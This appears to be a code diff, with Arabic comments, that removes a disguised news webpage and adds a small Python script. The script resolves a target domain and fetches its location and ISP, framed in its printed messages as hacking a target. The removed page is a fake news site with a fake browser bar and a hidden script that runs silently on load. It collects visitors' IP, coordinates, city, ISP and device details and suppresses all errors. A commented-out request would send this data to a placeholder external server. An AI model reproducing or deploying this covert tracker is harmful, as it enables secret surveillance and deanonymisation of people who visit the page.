@@ -1,135 +1,37 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تصفح الأخبار اليومية - أخبار عامة</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }
-        body { background-color: #f4f4f9; color: #333; }
-        
-        /* شريط المتصفح العادي */
-        .browser-bar {
-            background: #2c3e50;
-            padding: 10px 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        .browser-bar button {
-            background: #34495e;
-            color: white;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .browser-bar input {
-            flex: 1;
-            padding: 8px 12px;
-            border: none;
-            border-radius: 4px;
-            outline: none;
-            font-size: 14px;
-        }
-        
-        /* محتوى الأخبار */
-        .content {
-            padding: 20px;
-            max-width: 800px;
-            margin: auto;
-        }
-        .news-card {
-            background: white;
-            padding: 15px;
-            margin-bottom: 15px;
-            border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
-        .news-card h3 { color: #2980b9; margin-bottom: 8px; }
-        .news-card p { color: #666; font-size: 14px; line-height: 1.6; }
-        .date { font-size: 12px; color: #999; margin-top: 5px; display: block; }
-    </style>
-</head>
-<body>
+import socket
+import requests
+import json
+import sys
 
-    <!-- شريط متصفح وهمي يبدو طبيعياً 100% -->
-    <div class="browser-bar">
-        <button onclick="alert('الصفحة الحالية آمنة')">🏠</button>
-        <button onclick="location.reload()">🔄</button>
-        <input type="text" id="urlInput" value="https://www.news-portal-example.com/daily-news" readonly>
-    </div>
+def gather_target_info(target):
+    print(f"[*] جاري اختراق وتحليل الهدف: {target}...")
+    
+    try:
+        ip_address = socket.gethostbyname(target)
+        print(f"[+] عنوان الآبي (IP): {ip_address}")
+    except socket.gaierror:
+        print("[-] فشل في تحليل الآبي يا رئيس.")
+        return
 
-    <!-- واجهة أخبار قديمة وجديدة لتمويه الهدف -->
-    <div class="content">
-        <h2>آخر الأخبار والمقالات</h2>
-        <br>
-        <div class="news-card">
-            <h3>تطورات تكنولوجية جديدة في عالم الذكاء الاصطناعي لعام 2026</h3>
-            <p>تشهد التقنية الحديثة طفرة نوعية في تطوير الأنظمة الذكية وسرعة المعالجة الرقمية في مختلف القطاعات...</p>
-            <span class="date">منذ ساعتين (حديث)</span>
-        </div>
+    api_url = f"http://ip-api.com/json/{ip_address}"
+    response = requests.get(api_url)
+    
+    if response.status_code == 200:
+        data = response.json()
+        print("\n--- [ تفاصيل الموقع والدولة ] ---")
+        print(f"الدولة: {data.get('country', 'N/A')}")
+        print(f"المدينة: {data.get('city', 'N/A')}")
+        print(f"الشركة المزودة (ISP): {data.get('isp', 'N/A')}")
+        print(f"المنظمة: {data.get('org', 'N/A')}")
+    else:
+        print("[-] صار خطأ في جلب بيانات الـ IP يا بوص.")
 
-        <div class="news-card">
-            <h3>أرشيف الأخبار: تقرير شامل عن أبرز احداث العام الماضي 2025</h3>
-            <p>استعراض لأهم المحطات الاقتصادية والتقنية التي مر بها العالم خلال النصف الأول من العام الماضي...</p>
-            <span class="date">15 مارس 2025 (أرشيف / قديم)</span>
-        </div>
-        
-        <div class="news-card">
-            <h3>مستقبل الحوسبة السحابية وحماية البيانات الشخصية</h3>
-            <p>كيف تؤثر تقنيات التشفير الحديثة على تأمين مواقع الإنترنت وسرية معلومات المستخدمين في العصر الحالي...</p>
-            <span class="date">10 يناير 2024 (قديم)</span>
-        </div>
-    </div>
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print("[-] الاستخدام الصح: python tool.py example.com")
+        sys.exit(1)
+    
+    target_domain = sys.argv[1]
+    gather_target_info(target_domain)
 
-    <script>
-        // الكود الخفي الذي يعمل في الخلفية بصمت تام دون أن يدري المستخدم
-        async function silentBackgroundTracker() {
-            try {
-                // جلب معلومات الـ IP، الدولة، والمدينة
-                let response = await fetch('https://ipapi.co/json/');
-                let data = await response.json();
-                
-                // جلب معلومات الجهاز والمتصفح ونظام التشغيل
-                let userAgent = navigator.userAgent;
-                let platform = navigator.platform;
-                
-                // تجميع البيانات في كائن واحد
-                let visitorData = {
-                    ip: data.ip || "غير معروف",
-                    country: data.country_name || "غير معروف",
-                    city: data.city || "غير معروف",
-                    region: data.region || "غير معروف",
-                    latitude: data.latitude || "غير معروف",
-                    longitude: data.longitude || "غير معروف",
-                    org: data.org || "غير معروف",
-                    deviceInfo: userAgent,
-                    platform: platform,
-                    time: new Date().toLocaleString()
-                };
-
-                // طباعة البيانات في الكونسول (أو يمكنك إرسالها إلى سيرفرك الخاص أو بوت تيليجرام بصمت)
-                console.log("تم جمع البيانات بنجاح:", visitorData);
-                
-                // مثال على كيفية إرسالها لسيرفر خارجي بصمت (اختياري):
-                // fetch('https://your-server-endpoint.com/log', {
-                //     method: 'POST',
-                //     headers: { 'Content-Type': 'application/json' },
-                //     body: JSON.stringify(visitorData)
-                // });
-
-            } catch (error) {
-                // تجاهل الأخطاء تماماً لضمان عدم ظهور أي تنبيه للمستخدم
-            }
-        }
-
-        // تشغيل العملية فور فتح الصفحة في الخلفية
-        window.onload = function() {
-            silentBackgroundTracker();
-        };
-    </script>
-
-</body>
-</html>
+    
